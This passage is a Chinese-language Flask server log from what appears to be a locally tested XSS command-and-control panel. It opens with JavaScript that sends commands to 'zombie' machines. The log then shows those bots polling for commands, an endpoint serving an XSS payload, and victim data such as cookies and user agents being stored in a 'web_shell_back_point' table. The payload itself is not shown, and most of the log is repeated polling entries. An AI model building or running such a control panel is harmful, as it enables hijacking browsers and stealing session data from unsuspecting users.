document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-25 00:15:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:45] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-25 00:15:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:45] "GET /static/css/control_message.css HTTP/1.1" 200 -
2025-06-25 00:15:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:45] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
2025-06-25 00:15:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:45] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-25 00:15:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:46 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:50 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:51 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-25 00:15:51 | INFO     | control_route.py:135 | xss_payload() | 用戶請求XSS載荷文件
2025-06-25 00:15:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0004s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-25 00:15:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:51] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-25 00:15:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-25 00:15:51 | INFO     | control_route.py:28 | add_message() | 用戶請求添加消息 (POST)
2025-06-25 00:15:51 | INFO     | control_route.py:51 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: {"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T16:15:51.595Z"},時間: 2025-06-25 00:15:51.605079
2025-06-25 00:15:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0062s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-25 00:15:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:51] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-25 00:15:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-25 00:15:52 | INFO     | control_route.py:135 | xss_payload() | 用戶請求XSS載荷文件
2025-06-25 00:15:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0004s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-25 00:15:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:52] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-25 00:15:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-25 00:15:52 | INFO     | control_route.py:28 | add_message() | 用戶請求添加消息 (POST)
2025-06-25 00:15:52 | ERROR    | control_route.py:68 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T16:15:52.234Z"}', None, '2025-06-25 00:15:52.240381', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-25 00:15:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0022s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-25 00:15:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:52] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-25 00:15:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-25 00:15:52 | INFO     | control_route.py:135 | xss_payload() | 用戶請求XSS載荷文件
2025-06-25 00:15:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-25 00:15:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:52] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-25 00:15:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-25 00:15:52 | INFO     | control_route.py:28 | add_message() | 用戶請求添加消息 (POST)
2025-06-25 00:15:52 | ERROR    | control_route.py:68 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T16:15:52.465Z"}', None, '2025-06-25 00:15:52.469808', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-25 00:15:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0030s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-25 00:15:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:52] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-25 00:15:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:53 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:54 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:55 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:15:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:15:56 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:15:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:15:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:15:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-25 00:16:00 | INFO     | control_route.py:135 | xss_payload() | 用戶請求XSS載荷文件
2025-06-25 00:16:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-25 00:16:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:00] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-25 00:16:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-25 00:16:00 | INFO     | control_route.py:28 | add_message() | 用戶請求添加消息 (POST)
2025-06-25 00:16:00 | ERROR    | control_route.py:68 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T16:16:00.906Z"}', None, '2025-06-25 00:16:00.911265', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-25 00:16:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0021s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-25 00:16:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:00] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-25 00:16:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:01 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:02 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:03 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:04 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:05 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:06 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:07 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:08 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:09 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0023s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:10 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:11 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:12 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:13 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:14 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:14] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:15 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:16 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:17 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:18 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:19 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:20 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:21 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:22 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:23 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:24 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:25 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:26 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:27 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:28 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:16:29 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:16:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:16:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:16:29] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:16:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
